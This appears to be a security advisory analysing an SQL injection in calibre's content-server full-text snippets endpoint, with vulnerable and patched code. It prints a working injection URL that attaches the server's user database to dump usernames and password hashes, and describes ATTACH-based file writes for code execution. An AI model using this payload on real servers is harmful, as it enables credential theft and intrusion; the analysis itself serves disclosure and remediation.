1. Summary  
- Vulnerability: SQL Injection (CWE-89) in Calibre content-server full-text search API.  
- Affected versions: calibre v7.15.0 and earlier (≤ 7.15.0).  
- Impact: Any low-privileged user with permission to run full-text searches can inject arbitrary SQL into the SQLite query, read sensitive data from any attached database on the server filesystem and even perform limited file writes (via ATTACH).  

2. Root Cause Analysis  
- The `/fts/snippets/{book_ids}` endpoint accepts two optional parameters: `highlight_start` and `highlight_end`.  
- These parameters are interpolated directly into the snippet SQL function call without escaping or parameterization. In `src/calibre/db/fts/connect.py`, the vulnerable code is (around patch line [1] in advisory):  
  ```
  if snippet_size is not None:
      text = f'''snippet("{fts_table}", 0, '{highlight_start}', '{highlight_end}', '…', 32)'''
  else:
      text = f'''highlight("{fts_table}", 0, '{highlight_start}', '{highlight_end}')'''
  ```
- Because the strings are wrapped in single quotes inside the f-string, an attacker can inject a single quote and arbitrary SQL. For example, ending the snippet invocation, appending a semicolon, attaching another database, and selecting from it.
- The patch changes these f-strings to use parameter placeholders (`?`) and moves the user-supplied `highlight_start` and `highlight_end` values into the SQLite parameter list (`data.append(highlight_start)` etc.), preventing injection.  

3. Exploitation Details  
- A low-privileged user who can issue full-text searches crafts a malicious URL targeting the snippets endpoint. They supply a `highlight_end` parameter that breaks out of the quoted context and injects additional SQL statements.  
- Example attack URL (note: spaces are percent-encoded as “%20” or “+” in real URLs):  
  ```
  http://CALIBRE_SERVER/fts/snippets/1
      ?library_id=Calibre_Library
      &query=C
      &query_id=1
      &highlight_end=','',32) FROM books_text
         JOIN books_fts_stemmed ON fts_db.books_text.id = books_fts_stemmed.rowid
         WHERE "books_fts_stemmed" MATCH ?;
         ATTACH 'C:\Users\Devesh\AppData\Roaming\calibre\server-users.sqlite' AS suwu;
         SELECT 1,1,name,pw FROM suwu.users;-- -
  ```  
  Expanded (with newlines for clarity):  
  ```
  /fts/snippets/1?
    library_id=Calibre_Library
    &query=C
    &query_id=1
    &highlight_end=','',32)
       FROM books_text
       JOIN books_fts_stemmed
         ON fts_db.books_text.id = books_fts_stemmed.rowid
       WHERE "books_fts_stemmed" MATCH ?;
    ATTACH 'C:\Users\Devesh\AppData\Roaming\calibre\server-users.sqlite' AS suwu;
    SELECT 1,1,name,pw FROM suwu.users;-- -
  ```
- What happens under the hood:  
  • The server builds an SQL string like:  
    ```
    SELECT books_text.id, books_text.book, books_text.format,
           snippet("books_fts_stemmed", 0, '', ''',32) FROM books_text
       JOIN books_fts_stemmed ON fts_db.books_text.id = books_fts_stemmed.rowid
       WHERE "books_fts_stemmed" MATCH ?
    ```
  • The injected `', '',32) …` closes the snippet(…) call, adds a new SELECT, attaches the `server-users.sqlite` file, and then runs a query revealing usernames and password hashes.  

- Limited File Write: Similarly, one can use `ATTACH DATABASE 'C:\path\to\newfile.sqlite';` to create a new SQLite file on disk, e.g., in a user’s Startup folder, to achieve code execution on next login.

4. Key Code Snippets (Vulnerable vs. Fixed)  

Vulnerable code in `src/calibre/db/fts/connect.py`:  
```
if snippet_size is not None:
    text = f'''snippet("{fts_table}", 0, '{highlight_start}',
                '{highlight_end}', '…', {max(1, min(snippet_size, 64))})'''
else:
    text = f'''highlight("{fts_table}", 0, '{highlight_start}',
                  '{highlight_end}')'''
# …
query += ' WHERE '
# …
query += f' "{fts_table}" MATCH ?'
data.append(fts_engine_query)
# then execute: conn.execute(query, tuple(data))
```

Patched code replaces inline interpolation with parameter placeholders and appends the values to the `data` list:  
```
data = []
if snippet_size is not None:
    text = f'''snippet("{fts_table}", 0, ?, ?, '…', {max(1, min(snippet_size, 64))})'''
else:
    text = f'''highlight("{fts_table}", 0, ?, ?)'''
data.append(highlight_start)
data.append(highlight_end)
# …
query += f' "{fts_table}" MATCH ?'
data.append(fts_engine_query)
# conn.execute(query, tuple(data))
```

By moving the user strings into SQL parameters, single quotes and other SQL metacharacters are safely escaped by the SQLite driver, closing the injection vector.